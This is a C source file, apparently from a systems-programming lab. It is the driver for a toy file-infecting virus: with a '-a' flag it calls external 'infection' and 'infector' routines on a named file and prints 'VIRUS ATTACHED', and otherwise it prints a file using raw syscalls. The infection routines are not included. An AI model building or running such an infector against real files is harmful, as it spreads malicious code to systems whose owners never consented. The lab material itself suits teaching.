#include "util.h"

#define SYS_WRITE 4
#define STDOUT 1
#define SYS_CLOSE 6
#define SYS_READ 3
#define SYS_OPEN 5
#define O_RDWR 2
#define SYS_SEEK 19
#define SEEK_SET 0
#define SHIRA_OFFSET 0x291

extern int system_call();
extern void infection();
extern void infector(char*);

void printFile(const char *filename) {
    int fd = system_call(SYS_OPEN, filename, O_RDWR, 0);
    if (fd == -1) {
        
        char errorMsg[] = "Error opening file\n";
        system_call(SYS_WRITE, 2, errorMsg, sizeof(errorMsg) - 1);
        system_call(1, 0x55);
    }

    char buffer[8192];
    int bytesRead;

    while ((bytesRead = system_call(SYS_READ, fd, buffer, sizeof(buffer))) > 0) {
        int bytesWritten = system_call(SYS_WRITE, STDOUT, buffer, bytesRead);
        if (bytesWritten == -1) {
            
            system_call(SYS_CLOSE, fd);
            system_call(1, 0x55);
        }
    }

    if (bytesRead == -1) {
        
        system_call(SYS_CLOSE, fd);
        system_call(1, 0x55);
    }

    system_call(SYS_CLOSE, fd);
}

int main(int argc, char *argv[]) {
    if (argc != 2) {
        char errorMsg[] = "Error in number of arguments\n";
        system_call(SYS_WRITE, 2, errorMsg, sizeof(errorMsg) - 1);
        system_call(1, 0x55);
    }
    if (strncmp(argv[1], "-a", 2) == 0) {
    infection(); 
    infector(argv[1] + 2); 
    char attachedMsg[] = "VIRUS ATTACHED\n";
    system_call(SYS_WRITE, STDOUT, attachedMsg, sizeof(attachedMsg) - 1);
}

    printFile(argv[1]);

    return 0;
}